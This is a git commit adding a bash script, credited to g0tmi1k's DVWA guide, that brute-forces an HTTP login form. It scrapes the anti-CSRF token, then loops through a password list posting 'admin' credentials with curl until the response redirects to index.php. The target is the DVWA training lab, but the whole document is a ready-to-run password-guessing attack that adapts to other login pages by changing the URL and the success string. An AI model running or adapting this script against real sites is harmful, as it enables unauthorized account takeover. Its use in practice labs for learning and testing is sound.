741e142f2ba1479032ef01cc51a6d5ad4931862a
avwrgit123 <168300092+avwrgit123@users.noreply.github.com>
2025-06-22 15:03:43 +0300

    Create brute_force_script.sh

---
+++ brute_force_script.sh
@@ -0,0 +1,48 @@
+#!/bin/bash
+# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
+# Target: DVWA v1.10
+#   Date: 2015-10-19
+# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
+# Source: https://blog.g0tmi1k.com/dvwa/login/
+
+## Variables
+URL="http://ip"
+PASS_LIST="passwords.txt"
+
+## Value to look for in response (Whitelisting)
+SUCCESS="Location: index.php"
+
+## Anti CSRF token
+CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
+[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1
+
+## Counter
+i=0
+
+## Password loop
+while read -r _PASS; do
+
+  ## Increase counter
+  ((i=i+1))
+
+  ## Feedback for user
+  echo "[i] Try ${i}: admin // ${_PASS}"
+
+  ## Connect to server
+  REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=admin&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
+  [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'
+
+  ## Check response
+  echo "${REQUEST}" | grep -q "${SUCCESS}"
+  if [[ "$?" -eq 0 ]]; then
+    ## Success!
+    echo -e "\n\n[i] Found!"
+    echo "[i] Username: admin"
+    echo "[i] Password: ${_PASS}"
+    break
+  fi
+
+done < ${PASS_LIST}
+
+## Clean up
+rm -f /tmp/dvwa.cookie
